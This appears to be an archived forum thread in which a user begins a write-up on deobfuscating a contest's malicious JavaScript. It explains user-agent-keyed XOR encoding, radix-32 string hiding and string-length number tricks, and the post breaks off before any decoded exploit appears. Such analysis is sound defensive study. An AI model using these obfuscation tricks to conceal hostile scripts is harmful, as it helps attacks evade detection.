    writeLink(5756, 0, 0, 311, "I,L", "<i>XOR decoding routine: \n...</i>", "09-21-2011", "08:46 PM", 0, "showthread1779.html?t=1516&amp;p=5756#post5756");
  writeLink(5755, 0, 0, 311, "T", "<i>Continuing this way, we can...</i>", "09-21-2011", "08:41 PM", 0, "showthreadbaf3.html?t=1516&amp;p=5755#post5755");
  writeLink(5757, 0, 0, 311, "L", "<i>The decoded code obtained...</i>", "09-21-2011", "08:51 PM", 0, "showthread7d10.html?t=1516&amp;p=5757#post5757");

		//-->
		</script>
	</div>
</div>
	

	
		<ol class="posts" id="posts" start="1">
			
<li class="postbitlegacy postbitim postcontainer old" id="post_5752">
<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->

	<div class="posthead">
			<span class="postdate old">
				
					<span class="date">09-21-2011, <span class="time">08:37 PM</span></span>
				
			</span>
			<span class="nodecontrols">
				
					<a class="postcounter" href="showthreadd474.html?t=1516&amp;p=5752&amp;viewfull=1#post5752" name="post5752">#1</a><a id="postcount5752" name="1"></a>
				
				
				
			</span>
	</div>
	<div class="postdetails">
		<div class="userinfo">
			<div class="username_container">
			
				<div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="memberdb73.html?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a class="siteicon_profile" href="memberdb73.html?u=311">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a class="siteicon_forum" href="search9737.html?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a class="siteicon_message" href="private1fcf.html?do=newpm&amp;u=311" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_blog" href="blogdb73.html?u=311" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		
		
		<li class="right">
			<a class="siteicon_article" href="list1ee8.html?r=author/311-c0d3inj3cT" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>
				<img alt="c0d3inj3cT is offline" border="0" class="inlineimg onlinestatus" src="images/statusicon/user-offline.png"/>

			
			</div>
			<span class="usertitle">
				Garage Member
			</span>
			
			
			
				<span class="postbit_reputation" id="repdisplay_5752_311" title="c0d3inj3cT will become famous soon enough">
					
						<img alt="" class="repimg" src="images/reputation/reputation_pos.png"/>
					
						<img alt="" class="repimg" src="images/reputation/reputation_pos.png"/>
					
				</span>
			
			 
			
				<hr/>
				<dl class="userinfo_extra">
					<dt>Join Date</dt> <dd>Dec 2010</dd>
					
					
					<dt>Posts</dt> <dd>67</dd>	
					<dt>Blog Entries</dt><dd><a href="blogdb73.html?u=311">2</a></dd>
				</dl>
				
				
				<div class="imlinks">
					    
				</div>
			
		</div>
		<div class="postbody">
			<div class="postrow">
				
				
				<h2 class="title icon">
					JavaScript Deobfuscation Challange on Breaking Point
				</h2>
				


						
						
				<div class="content">
					<div id="post_message_5752">
						<blockquote class="postcontent restore">
							I decided to take some time out and prepare a detailed write up on how I went about solving the JavaScript Deobfuscation Challenge posted on BreakingPoint Systems' Blog recently.<br/>
<br/>
You can read more about the contest and the scenario given in the challenge here:<br/>
<br/>
<a href="http://www.breakingpointsystems.com/community/blog/javascript-obfuscations-contest/" target="_blank">http://www.breakingpointsystems.com/...tions-contest/</a><br/>
<br/>
First off, I would like to thank Ricky for setting up this challenge. It was interesting and it really makes you think beyond the normal capabilities of JavaScript language which we most are aware of.<br/>
<br/>
As you proceed to solve this Obfuscated JavaScript, you will uncover certain facts about JavaScript which will come to you as a surprise.<br/>
<br/>
<b>The concept:</b><br/>
<br/>
The exploit code is encoded using XOR encoding. In order to decode this XOR encoded code, we need a passphrase. There's a nice concept used here.<br/>
<br/>
The first part of the script will detect the Victim's User Agent and based on that will return a Random PreGenerated Passphrase.<br/>
<br/>
This passphrase, when XOR'ed with Encoded JavaScript, will yield the plain text.<br/>
<br/>
It's not as easy at it sounds though. Keep reading to find out more about it.<br/>
<br/>
Here's a list of the different tricks applied in order to obfuscate the code and make it difficult for the reversers to analyse it:<br/>
<br/>
<b>Strings represented as numbers using Base Conversion with Radix 32.</b><br/>
<br/>
Here, the Radix 32 was represented as a bitwise XOR operation between 2 numbers.<br/>
<br/>
A bitwise leftshift is essentially equivalent to multiplying the number with 2 (exponent the number of leftshifts)<br/>
<br/>
Some examples:<br/>
<br/>
16&lt;&lt;1 = 16 * 2^1 = 32<br/>
2&lt;&lt;4 = 2 * 2^4 = 32<br/>
4&lt;&lt;3 = 4 * 2^3 = 32<br/>
<br/>
In JavaScript, the toString() function is used to convert a Number to String. When supplied the radix value of 32 to this function, it essentially converts the Base to 32 from decimal.<br/>
<br/>
An example would help to understand better.<br/>
<br/>
720094129..toString(16&lt;&lt;1)+""<br/>
<br/>
720094129 is in Decimal (base 10).<br/>
16&lt;&lt;1 = 32 as we have already seen above.<br/>
<br/>
720094129..toString(16&lt;&lt;1)+"" = 720094129..toString(32)+""<br/>
<br/>
We need to find out the Base 32 value for 720094129 in Base 10.<br/>
<br/>
You can use this site for Base Conversion:<br/>
<br/>
<a href="http://www.convertit.com/go/convertit/calculators/math/base_converter.asp" target="_blank">http://www.convertit.com/go/converti..._converter.asp</a><br/>
<br/>
The number, 720094129 in Base 32 is equivalent to the String, length<br/>
<br/>
720094129..toString(32)+""= length + "" = length<br/>
<br/>
Representing Numbers as an Expression operating on Strings.<br/>
<br/>
A clever trick was used to represent numbers, especially small numbers (0-9) as an Expression Operating on a String.<br/>
<br/>
1 could be represented as the Length of a Single Char.<br/>
<br/>
'C'[length] = 1<br/>
<br/>
But we know from above analysis that the string "length" can also be written as: 720094129..toString(32)+""<br/>
<br/>
so, 'C'[720094129..toString(32)+""] = 1<br/>
<br/>
In the JavaScript given to us. There are several "if" expressions evaluated. Let's take one as an example and the same approach can be extended to the remaining.<br/>
<br/>
if(uUHIjMJVFJET.indexOf(String.fromCharCode(0157,1  12,0145,114,97)) != -'Z'[720094129..toString(16&lt;&lt;1)+""])<br/>
<br/>
'Z'[720094129..toString(16&lt;&lt;1)+""] = 1<br/>
<br/>
So, the above "if" expression reduces to:<br/>
<br/>
if(uUHIjMJVFJET.indexOf(String.fromCharCode(0157,1  12,0145,114,97)) != -1)
						</blockquote>
					</div>

					
				</div>
			</div>
			
			<div class="cleardiv"></div>
		</div>
	</div>
		<div class="postfoot">
			<!-- <div class="postfoot_container"> -->
			<div class="textcontrols floatcontainer">
				<span class="postcontrols">
					<img alt="" id="progress_5752" src="images/misc/progress.gif" style="display:none"/>
					
					
					
						<a class="newreply" href="newreply26ab.html?do=newreply&amp;p=5752" id="qrwq_5752" rel="nofollow" title="Reply With Quote"><img alt="Reply With Quote" id="quoteimg_5752" src="clear.gif"/>  Reply With Quote</a> 
					
					
					
				</span>
				<span class="postlinking">
					
						
					

					
					
					
					

					
					

					
					
					
					
					
				</span>
			<!-- </div> -->
			</div>
		</div>
	<hr/>
</li>

		</ol>
                <div class="separator"></div>
		<div class="postlistfoot">
			
		</div>

	

</div>

<div class="noinlinemod below_postlist" id="below_postlist">
	
	<div class="pagination_bottom" id="pagination_bottom">
	
		<div class="clear"></div>
<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
	
		<span class="shade">Quick Navigation</span>
		<a class="popupctrl" href="showthread860e.html?t=1516"><span class="ctrlcontainer">Reverse Engineering and Application Cracking</span></a>
		<a class="textcontrol" href="showthread860e.html?t=1516#top" onclick="document.location.hash='top';return false;">Top</a>
	
	<ul class="navpopupbody popupbody popuphover">
		
		<li class="optionlabel">Site Areas</li>
		<li><a href="usercp.html">Settings</a></li>
		<li><a href="private.html">Private Messages</a></li>
		<li><a href="subscription.html">Subscriptions</a></li>
		<li><a href="online.html">Who's Online</a></li>
		<li><a href="search.html">Search Forums</a></li>
		<li><a href="forum.html">Forums Home</a></li>
		
			<li class="optionlabel">Forums</li>
			
		
			
				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
			
		
			
				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
			
		
			
				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
			
		
			
				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
			
		
			
				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
			
		
			
				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
			
		
			
				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
			
		
			
				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
			
		
			
				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
			
		
			
				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
			
		
			
				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
			
		
			
				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
			
		
			
				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
			
		
			
				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
			
		
			
				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
			
		
			
				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
			
		
			
				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
			
		
			
				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
			
		
			
				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
			
		
			
				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
			
		
			
				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
			
		
			
				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
			
		
			
				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
			
		
			
				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
			
		
			
				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
			
		
			
				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
			
		
			
				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
			
		
			
					</ol>
				</li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
			
		
			
				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
			
		
			
				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
			
		
			
				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
			
		
			
				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
			
		
			
				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
			
		
			
				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
			
		
			
				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
			
		
			
					</ol>
				</li>
			
		
		
	</ul>
</div>
<div class="clear"></div>
	</div>
</div>










<!-- next / previous links -->
<div class="navlinks">
	
	<strong>«</strong>
	<a href="showthread8abd.html?t=1516&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
	|
	<a href="showthread383c.html?t=1516&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
	<strong>»</strong>
	
</div>
<!-- / next / previous links -->

<div class="thread_info" id="thread_info">
	
	
	
	
	<div class="options_block_container">
		
		<div class="options_block">
			<h4 class="collapse">
				<a class="collapse" href="showthread860e.html?t=1516#top" id="collapse_posting_rules"><img alt="" src="images/buttons/collapse_40b.png"/></a>
				<span class="optiontitle">Posting Permissions</span>
			</h4>
			<div class="thread_info_block" id="posting_rules">
				
<div class="info_subblock" id="forumrules">

	<ul class="youcandoblock">
		<li>You <strong>may not</strong> post new threads</li>
		<li>You <strong>may not</strong> post replies</li>
		<li>You <strong>may not</strong> post attachments</li>
		<li>You <strong>may not</strong> edit your posts</li>
		<li> </li>
	</ul>
	<div class="bbcodeblock">
		<ul>
			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
			<li>HTML code is <strong>Off</strong></li>
		</ul>
	</div>
	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>

</div>

			</div>
		</div>

	</div>

</div>








<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
</div>

<div class="floatcontainer footer" id="footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label=" Standard Styles">
									
					
	<option class="" selected="selected" value="1">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label=" Mobile Styles">
					
					
	<option class="" value="2">-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul class="footer_links" id="footer_links">
		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="#" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="showthread860e.html?t=1516#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:51 PM</span>.</div>

<div class="shade footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="shade footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	<img alt="" border="0" height="1" src="cronc843.gif?rand=1584879691" width="1"/>
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>

</div></body></html>